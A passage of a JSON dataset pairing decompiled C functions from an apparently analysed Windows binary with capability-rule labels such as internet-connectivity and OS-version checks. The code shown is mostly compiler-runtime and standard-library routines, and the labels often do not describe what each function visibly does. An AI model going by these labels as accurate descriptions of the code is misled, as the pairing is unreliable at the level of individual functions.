            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425eb2(int32_t *param_1)\n\n{\n    int32_t **arg_8h;\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470210;\n    var_ch = *in_FS_OFFSET;\n    uVar3 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if ((((*(param_1 + 0x14) != '\\0') && (*param_1 == -0x1f928c9d)) && (param_1[4] == 3)) &&\n       (((iVar4 = param_1[5],  iVar4 == 0x19930520 || (iVar4 == 0x19930521)) ||\n        ((iVar4 == 0x19930522 || (iVar4 == 0x1994000)))))) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_DecodePointer)(param_1[7], uVar3);\n        if (iVar4 == 0) {\n            fcn.004567ea();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        arg_8h = param_1[6];\n        if (arg_8h != NULL) {\n            if (*(iVar4 + 4) == 0) {\n                if (((**(*(iVar4 + 0xc) + 4) & 8) != 0) && (piVar1 = *arg_8h,  piVar1 != NULL)) {\n                    pcVar2 = *(*piVar1 + 8);\n                    (**0x4742a4)(piVar1);\n                    (*pcVar2)();\n                }\n            }\n            else {\n                fcn.00426080(arg_8h, *(iVar4 + 4));\n            }\n        }\n        fcn.004557fb(param_1[6]);\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 488
    },
    "004264e7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.004264e7(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t iVar2;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(4);\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleExW)(2, 0, unaff_EBP + -0x10);\n    if (((iVar1 == 0) || (*(unaff_EBP + -0x10) == 0)) || (*(unaff_EBP + -0x10) == 0x400000)) {\n        iVar1 = fcn.0042706e(0x49501c);\n        if (iVar1 != 0) {\n            fcn.00426ceb(iVar1);\n        }\n        iVar2 = *0x495018 + -1;\n        *0x495018 = iVar2;\n        *(unaff_EBP + -4) = 0;\n        iVar1 = fcn.00427093(0x49501c);\n        if (iVar1 != 0) {\n            fcn.00426ceb(iVar1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (iVar2 == 0) {\n            *(unaff_EBP + -4) = 1;\n            iVar1 = fcn.00426b6a(0x495050);\n            if (iVar1 != 0) {\n                fcn.00426ceb(iVar1);\n            }\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 387
    },
    "00426579": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.00426579(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(4);\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleExW)(2, 0, unaff_EBP + -0x10);\n    if (((iVar1 == 0) || (*(unaff_EBP + -0x10) == 0)) || (*(unaff_EBP + -0x10) == 0x400000)) {\n        iVar1 = fcn.0042706e(0x49501c);\n        if (iVar1 != 0) {\n            fcn.00426ceb(iVar1);\n        }\n        *0x495018 = *0x495018 + 1;\n        *(unaff_EBP + -4) = 0;\n        iVar1 = fcn.00427093(0x49501c);\n        if (iVar1 != 0) {\n            fcn.00426ceb(iVar1);\n        }\n    }\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 290
    },
    "00426606": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00426606(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t phModule;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleExW)(2, 0, &phModule);\n    if (((iVar1 == 0) || (phModule == 0)) || (phModule != 0x400000)) {\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleExW)(4, arg_8h[1], &phModule);\n    }\n    fcn.0043972d(*arg_8h);\n    return 0;\n}\n",
        "token_count": 139
    },
    "0042664d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042664d(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t phModule;\n    \n    if (*0x4953e8 == *0x49106c) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleExW)(2, 0, &phModule);\n        if (((iVar1 == 0) || (phModule == 0)) || (phModule != 0x400000)) {\n            (*_sym.imp.KERNEL32.dll_GetModuleHandleExW)(5, arg_8h[1], &phModule);\n        }\n        *arg_8h = arg_8h;\n        iVar1 = (*_sym.imp.KERNEL32.dll_QueueUserWorkItem)(fcn.00426774, arg_8h, 0);\n        if (iVar1 != 0) {\n            return 0;\n        }\n        *arg_8h = 0;\n    }\n    else {\n        iVar1 = fcn.00439490(fcn.004266d9, arg_8h, 0);\n        *arg_8h = iVar1;\n        if (iVar1 != 0) {\n            uVar2 = fcn.00426606(arg_8h);\n            return uVar2;\n        }\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    return uVar2;\n}\n",
        "token_count": 317
    },
    "004266d9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004266d9(uint arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470210;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00426579(uVar2);\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleExW)(2, 0, &var_10h);\n    if (((iVar3 == 0) || (var_10h == 0)) || (var_10h != 0x400000)) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleExW)(6, *(arg_ch + 4), &var_10h);\n        if ((iVar3 != 0) && (var_10h != 0)) {\n            fcn.004394d1(arg_8h, var_10h);\n        }\n    }\n    pcVar1 = *(arg_ch + 4);\n    (**0x4742a4)(*(arg_ch + 8));\n    (*pcVar1)();\n    fcn.004264e7();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 345
    },
    "0043c06b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043c06b(int32_t *param_1)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    uint var_24h;\n    int32_t *var_8h;\n    uint *var_4h;\n    \n    if (*param_1 != 0) {\n        fcn.0043c95e(param_1 + 1);\n        puVar1 = *param_1;\n        *param_1 = 0;\n        var_4h = puVar1;\n        fcn.0043c990();\n        while (puVar1 != NULL) {\n            var_8h = NULL;\n            pcVar2 = **puVar1[1];\n            (**0x4742a4)(&var_8h, var_4h);\n            (*pcVar2)();\n            var_4h = *var_4h;\n            pcVar2 = *(*puVar1[1] + 8);\n            (**0x4742a4)();\n            (*pcVar2)();\n            puVar1 = var_4h;\n            if (var_8h != NULL) {\n                pcVar2 = *(*var_8h + 0xc);\n                (**0x4742a4)();\n                (*pcVar2)();\n                puVar1 = var_4h;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 296
    },
    "00426ba6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\ncode ** __cdecl fcn.00426ba6(code **arg_8h)\n\n{\n    code **ppcVar1;\n    uint var_4h;\n    \n    if (-1 < *0x495210) {\n        if (*0x495210 < 2) {\n            if (*0x4953dc != *0x49106c) {\n                *arg_8h = vtable.Concurrency::details::stl_condition_variable_win7.0;\n                goto code_r0x004269a7;\n            }\n        }\n        else if (*0x495210 != 2) goto code_r0x00426983;\n        if (*0x4953c4 != *0x49106c) {\n            *arg_8h = vtable.Concurrency::details::stl_condition_variable_vista.0;\ncode_r0x004269a7:\n            ppcVar1 = fcn.004395f2(arg_8h + 1);\n            return ppcVar1;\n        }\n    }\ncode_r0x00426983:\n    *arg_8h = vtable.Concurrency::details::stl_condition_variable_concrt.0;\n    arg_8h[1] = NULL;\n    fcn.0043c923();\n    return arg_8h + 1;\n}\n",
        "token_count": 297
    },
    "00426d6d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\ncode ** __cdecl fcn.00426d6d(code **arg_8h)\n\n{\n    code **ppcVar1;\n    \n    if (-1 < *0x495210) {\n        if (*0x495210 < 2) {\n            if (*0x4953dc != *0x49106c) {\n                *arg_8h = vtable.Concurrency::details::stl_critical_section_win7.0;\n                ppcVar1 = fcn.0043964b(arg_8h + 1);\n                return ppcVar1;\n            }\n        }\n        else if (*0x495210 != 2) goto code_r0x00426d89;\n        if (*0x4953c4 != *0x49106c) {\n            *arg_8h = vtable.Concurrency::details::stl_critical_section_vista.0;\n            fcn.00439612(arg_8h + 1, 4000, 0);\n            return arg_8h;\n        }\n    }\ncode_r0x00426d89:\n    *arg_8h = vtable.Concurrency::details::stl_critical_section_concrt.0;\n    arg_8h[7] = NULL;\n    arg_8h[8] = NULL;\n    arg_8h[1] = NULL;\n    arg_8h[2] = NULL;\n    arg_8h[4] = NULL;\n    arg_8h[3] = 0x2;\n    arg_8h[5] = NULL;\n    arg_8h[6] = NULL;\n    return arg_8h + 1;\n}\n",
        "token_count": 357
    },
    "00427226": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00427226(int32_t arg_8h, int32_t arg_ch)\n\n{\n    if ((arg_ch == 1) && (arg_8h != 0)) {\n        fcn.00427129(arg_8h);\n    }\n    else {\n        arg_ch = 0;\n    }\n    return arg_ch;\n}\n",
        "token_count": 79
    },
    "004275ba": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004275ba(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    char cVar4;\n    uchar uVar5;\n    char *pcVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t unaff_EBP;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    uint32_t uVar6;\n    \n    fcn.0043ad07(0x34);\n    pcVar1 = *(unaff_EBP + 0x14);\n    iVar9 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x34) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x40) = *(unaff_EBP + 0xc);\n    cVar2 = *pcVar1;\n    *(unaff_EBP + -0x38) = iVar9;\n    pcVar7 = pcVar1;\n    cVar4 = cVar2;\n    if (cVar2 != '\\0') {\n        do {\n            if (cVar4 == cVar2) {\n                iVar9 = iVar9 + 1;\n            }\n            cVar4 = pcVar7[1];\n            pcVar7 = pcVar7 + 1;\n        } while (cVar4 != '\\0');\n        *(unaff_EBP + -0x38) = iVar9;\n    }\n    *(unaff_EBP + -0x14) = 0xf;\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x28) = 0;\n    fcn.0040acd0(iVar9, 0);\n    *(unaff_EBP + -4) = 0;\n    uVar8 = 1;\n    *(unaff_EBP + -0x3c) = 0xfffffffe;\n    *(unaff_EBP + -0x30) = 1;\n    while( true ) {\n        uVar10 = 0;\n        iVar9 = 0;\n        *(unaff_EBP + -0x29) = 0;\n        if (*(unaff_EBP + -0x38) == 0) break;\n        do {\n            cVar2 = pcVar1[iVar9];\n            if (cVar2 != '\\0') {\n                do {\n                    if (cVar2 == *pcVar1) break;\n                    iVar9 = iVar9 + 1;\n                    cVar2 = pcVar1[iVar9];\n                } while (cVar2 != '\\0');\n            }\n            iVar3 = unaff_EBP + -0x28;\n            if (0xf < *(unaff_EBP + -0x14)) {\n                iVar3 = *(unaff_EBP + -0x28);\n            }\n            if (*(iVar3 + uVar10) == '\\0') {\n                iVar9 = iVar9 + uVar8;\n                if ((pcVar1[iVar9] == *pcVar1) || (pcVar1[iVar9] == '\\0')) {\n                    uVar6 = uVar8;\n                    if (0x7e < uVar8) {\n                        uVar6 = 0x7f;\n                    }\n                    uVar5 = uVar6;\n                    iVar3 = unaff_EBP + -0x28;\n                    if (0xf < *(unaff_EBP + -0x14)) {\n                        iVar3 = *(unaff_EBP + -0x28);\n                    }\n                    *(unaff_EBP + -0x3c) = uVar10;\ncode_r0x004276eb:\n                    *(iVar3 + uVar10) = uVar5;\n                    goto code_r0x004276ee;\n                }\n                cVar2 = fcn.00435185(*(unaff_EBP + -0x40));\n                if (cVar2 != '\\0') {\ncode_r0x004276b3:\n                    uVar8 = *(unaff_EBP + -0x30);\n                    uVar6 = uVar8;\n                    if (0x7e < uVar8) {\n                        uVar6 = 0x7f;\n                    }\n                    uVar5 = uVar6;\n                    iVar3 = unaff_EBP + -0x28;\n                    if (0xf < *(unaff_EBP + -0x14)) {\n                        iVar3 = *(unaff_EBP + -0x28);\n                    }\n                    goto code_r0x004276eb;\n                }\n                iVar3 = *(unaff_EBP + -0x34);\n                if (*(iVar3 + 4) == '\\0') {\n                    fcn.00430056();\n                    iVar3 = *(unaff_EBP + -0x34);\n                }\n                if (pcVar1[iVar9] != *(iVar3 + 6)) goto code_r0x004276b3;\n                uVar8 = *(unaff_EBP + -0x30);\n                cVar2 = '\\x01';\n                *(unaff_EBP + -0x29) = 1;\n            }\n            else {\n                iVar3 = unaff_EBP + -0x28;\n                if (0xf < *(unaff_EBP + -0x14)) {\n                    iVar3 = *(unaff_EBP + -0x28);\n                }\n                iVar9 = iVar9 + *(iVar3 + uVar10);\ncode_r0x004276ee:\n                cVar2 = *(unaff_EBP + -0x29);\n            }\n            uVar10 = uVar10 + 1;\n        } while (uVar10 < *(unaff_EBP + -0x38));\n        if ((cVar2 == '\\0') || (cVar2 = fcn.00435185(*(unaff_EBP + -0x40)),  cVar2 != '\\0')) break;\n        *(unaff_EBP + -0x30) = *(unaff_EBP + -0x30) + 1;\n        fcn.0042eb11();\n        *(unaff_EBP + -0x3c) = 0xffffffff;\n        uVar8 = *(unaff_EBP + -0x30);\n    }\n    fcn.00406810();\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 1464
    },
    "00427737": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00427737(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int16_t *piVar1;\n    char cVar2;\n    int16_t iVar3;\n    uchar uVar4;\n    int16_t iVar5;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t unaff_EBP;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    uint32_t uVar6;\n    \n    fcn.0043ad07(0x34);\n    iVar7 = 0;\n    piVar1 = *(unaff_EBP + 0x14);\n    iVar9 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x30) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x40) = *(unaff_EBP + 0xc);\n    iVar3 = *piVar1;\n    *(unaff_EBP + -0x38) = iVar9;\n    iVar5 = iVar3;\n    if (iVar3 != 0) {\n        do {\n            if (iVar5 == iVar3) {\n                iVar9 = iVar9 + 1;\n            }\n            iVar7 = iVar7 + 1;\n            iVar5 = piVar1[iVar7];\n        } while (piVar1[iVar7] != 0);\n        *(unaff_EBP + -0x38) = iVar9;\n    }\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x14) = 0xf;\n    *(unaff_EBP + -0x28) = 0;\n    fcn.0040acd0(iVar9, 0);\n    *(unaff_EBP + -4) = 0;\n    uVar8 = 1;\n    *(unaff_EBP + -0x3c) = 0xfffffffe;\n    *(unaff_EBP + -0x34) = 1;\n    while( true ) {\n        uVar10 = 0;\n        *(unaff_EBP + -0x29) = 0;\n        iVar9 = 0;\n        if (*(unaff_EBP + -0x38) == 0) break;\n        do {\n            iVar3 = piVar1[iVar9];\n            if (iVar3 != 0) {\n                do {\n                    if (iVar3 == *piVar1) break;\n                    iVar9 = iVar9 + 1;\n                    iVar3 = piVar1[iVar9];\n                } while (iVar3 != 0);\n            }\n            iVar7 = unaff_EBP + -0x28;\n            if (0xf < *(unaff_EBP + -0x14)) {\n                iVar7 = *(unaff_EBP + -0x28);\n            }\n            if (*(iVar7 + uVar10) == '\\0') {\n                iVar9 = iVar9 + uVar8;\n                if ((piVar1[iVar9] == *piVar1) || (piVar1[iVar9] == 0)) {\n                    uVar6 = uVar8;\n                    if (0x7e < uVar8) {\n                        uVar6 = 0x7f;\n                    }\n                    uVar4 = uVar6;\n                    iVar7 = unaff_EBP + -0x28;\n                    if (0xf < *(unaff_EBP + -0x14)) {\n                        iVar7 = *(unaff_EBP + -0x28);\n                    }\n                    *(unaff_EBP + -0x3c) = uVar10;\ncode_r0x0042786f:\n                    *(iVar7 + uVar10) = uVar4;\n                    goto code_r0x00427872;\n                }\n                cVar2 = fcn.00435185(*(unaff_EBP + -0x40));\n                if (cVar2 != '\\0') {\ncode_r0x00427837:\n                    uVar8 = *(unaff_EBP + -0x34);\n                    uVar6 = uVar8;\n                    if (0x7e < uVar8) {\n                        uVar6 = 0x7f;\n                    }\n                    uVar4 = uVar6;\n                    iVar7 = unaff_EBP + -0x28;\n                    if (0xf < *(unaff_EBP + -0x14)) {\n                        iVar7 = *(unaff_EBP + -0x28);\n                    }\n                    goto code_r0x0042786f;\n                }\n                iVar7 = *(unaff_EBP + -0x30);\n                if (*(iVar7 + 4) == '\\0') {\n                    fcn.00430056();\n                    iVar7 = *(unaff_EBP + -0x30);\n                }\n                if (piVar1[iVar9] != *(iVar7 + 6)) goto code_r0x00427837;\n                uVar8 = *(unaff_EBP + -0x34);\n                cVar2 = '\\x01';\n                *(unaff_EBP + -0x29) = 1;\n            }\n            else {\n                iVar7 = unaff_EBP + -0x28;\n                if (0xf < *(unaff_EBP + -0x14)) {\n                    iVar7 = *(unaff_EBP + -0x28);\n                }\n                iVar9 = iVar9 + *(iVar7 + uVar10);\ncode_r0x00427872:\n                cVar2 = *(unaff_EBP + -0x29);\n            }\n            uVar10 = uVar10 + 1;\n        } while (uVar10 < *(unaff_EBP + -0x38));\n        if ((cVar2 == '\\0') || (cVar2 = fcn.00435185(*(unaff_EBP + -0x40)),  cVar2 != '\\0')) break;\n        *(unaff_EBP + -0x34) = *(unaff_EBP + -0x34) + 1;\n        fcn.0042eb11();\n        *(unaff_EBP + -0x3c) = 0xffffffff;\n        uVar8 = *(unaff_EBP + -0x34);\n    }\n    fcn.00406810();\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 1454
    },
    "00429401": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00429401(code **param_1)\n\n{\n    *param_1 = vtable.std::ctype_unsigned_short_int_.0;\n    if (param_1[4] != NULL) {\n        fcn.004557fb(param_1[3]);\n    }\n    fcn.004557fb(param_1[5]);\n    *param_1 = vtable.std::_Facet_base.0;\n    return;\n}\n",
        "token_count": 95
    },
    "0042942a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042942a(code **param_1)\n\n{\n    *param_1 = vtable.std::ctype_wchar_t_.0;\n    if (param_1[4] != NULL) {\n        fcn.004557fb(param_1[3]);\n    }\n    fcn.004557fb(param_1[5]);\n    *param_1 = vtable.std::_Facet_base.0;\n    return;\n}\n",
        "token_count": 96
    },
    "00429998": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl\nfcn.00429998(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint arg_ch_00;\n    uint arg_14h_00;\n    ushort uVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint uVar11;\n    uint noname_0;\n    int32_t unaff_EBP;\n    char *pcVar12;\n    uint32_t arg_1ch_00;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0043ad07(0x58);\n    uVar9 = *(unaff_EBP + 0x24);\n    pcVar12 = *(unaff_EBP + 0x20);\n    *(unaff_EBP + -100) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x54) = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -0x5c) = uVar9;\n    if ((uVar9 == 0) || ((*pcVar12 != '+' && (*pcVar12 != '-')))) {\n        arg_1ch_00 = 0;\n    }\n    else {\n        arg_1ch_00 = 1;\n    }\n    if ((*(*(unaff_EBP + 0x18) + 0x14) & 0x3000) == 0x3000) {\n        uVar11 = 0x4744c0;\n        if (((arg_1ch_00 + 2 <= uVar9) && (pcVar12[arg_1ch_00] == '0')) &&\n           ((pcVar12[arg_1ch_00 + 1] == 'x' || (pcVar12[arg_1ch_00 + 1] == 'X')))) {\n            arg_1ch_00 = arg_1ch_00 + 2;\n        }\n    }\n    else {\n        uVar11 = 0x4744bc;\n    }\n    uVar11 = fcn.0045a0c0(pcVar12, uVar11);\n    *(unaff_EBP + -0x58) = uVar11;\n    *(unaff_EBP + -0x50) = 0x2e;\n    puVar6 = fcn.0045b6c6();\n    *(unaff_EBP + -0x50) = **puVar6;\n    iVar7 = fcn.0045a0c0(pcVar12, unaff_EBP + -0x50);\n    fcn.00421bb3(*(*(unaff_EBP + -0x54) + 0x30));\n    *(unaff_EBP + -4) = 0;\n    uVar11 = fcn.00428405(unaff_EBP + -0x4c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x44) = uVar11;\n    fcn.00401990();\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x14) = 7;\n    *(unaff_EBP + -0x28) = 0;\n    fcn.00430e5e(*(unaff_EBP + -0x5c), 0);\n    iVar10 = unaff_EBP + -0x28;\n    *(unaff_EBP + -4) = 1;\n    if (7 < *(unaff_EBP + -0x14)) {\n        iVar10 = *(unaff_EBP + -0x28);\n    }\n    pcVar2 = *(**(unaff_EBP + -0x44) + 0x2c);\n    (**0x4742a4)(pcVar12, pcVar12 + *(unaff_EBP + -0x5c), iVar10);\n    (*pcVar2)();\n    fcn.00421bb3(*(*(unaff_EBP + -0x54) + 0x30));\n    *(unaff_EBP + -4) = 2;\n    piVar8 = fcn.00428e65(unaff_EBP + -0x4c);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x44) = piVar8;\n    fcn.00401990();\n    pcVar2 = *(*piVar8 + 0x14);\n    (**0x4742a4)(unaff_EBP + -0x40);\n    (*pcVar2)();\n    *(unaff_EBP + -4) = 3;\n    pcVar2 = *(**(unaff_EBP + -0x44) + 0x10);\n    (**0x4742a4)();\n    uVar9 = (*pcVar2)();\n    uVar9 = uVar9 & 0xffff;\n    *(unaff_EBP + -0x48) = uVar9;\n    if (iVar7 == *(unaff_EBP + -0x5c)) {\n        iVar7 = *(unaff_EBP + -0x58);\n    }\n    else {\n        pcVar2 = *(**(unaff_EBP + -0x44) + 0xc);\n        (**0x4742a4)();\n        uVar5 = (*pcVar2)();\n        iVar10 = unaff_EBP + -0x28;\n        if (7 < *(unaff_EBP + -0x14)) {\n            iVar10 = *(unaff_EBP + -0x28);\n        }\n        uVar9 = *(unaff_EBP + -0x48);\n        *(iVar10 + iVar7 * 2) = uVar5;\n    }\n    pcVar12 = unaff_EBP + -0x40;\n    if (0xf < *(unaff_EBP + -0x2c)) {\n        pcVar12 = *(unaff_EBP + -0x40);\n    }\n    while (((cVar1 = *pcVar12,  cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < iVar7 - arg_1ch_00))) {\n        iVar7 = iVar7 - cVar1;\n        fcn.004352e7(iVar7, 1, uVar9);\n        if ('\\0' < pcVar12[1]) {\n            pcVar12 = pcVar12 + 1;\n        }\n        uVar9 = *(unaff_EBP + -0x48);\n    }\n    iVar10 = *(unaff_EBP + -0x54);\n    uVar9 = *(unaff_EBP + -0x18);\n    *(unaff_EBP + -0x58) = uVar9;\n    uVar3 = *(iVar10 + 0x20);\n    if (((*(iVar10 + 0x24) < 0) || ((*(iVar10 + 0x24) < 1 && (uVar3 == 0)))) || (uVar3 <= uVar9)) {\n        iVar7 = 0;\n    }\n    else {\n        iVar7 = uVar3 - uVar9;\n    }\n    uVar9 = *(iVar10 + 0x14) & 0x1c0;\n    if (uVar9 == 0x40) {\n        var_28h = unaff_EBP + -0x28;\n        if (7 < *(unaff_EBP + -0x14)) {\n            var_28h = 